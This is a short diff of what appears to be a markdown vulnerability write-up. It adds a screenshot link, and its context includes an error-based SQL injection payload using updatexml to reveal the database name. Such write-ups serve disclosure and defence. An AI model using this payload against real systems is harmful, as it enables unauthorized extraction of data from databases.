@@ -37,6 +37,8 @@
 
 <img width="1339" height="686" alt="image" src="https://github.com/user-attachments/assets/648b0847-e327-4591-8380-16ff6a381287" />
 
+<img width="1330" height="677" alt="image" src="https://github.com/user-attachments/assets/4abd07b9-f958-45c6-8c78-f44b2c994cb7" />
+
 
 a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1
 
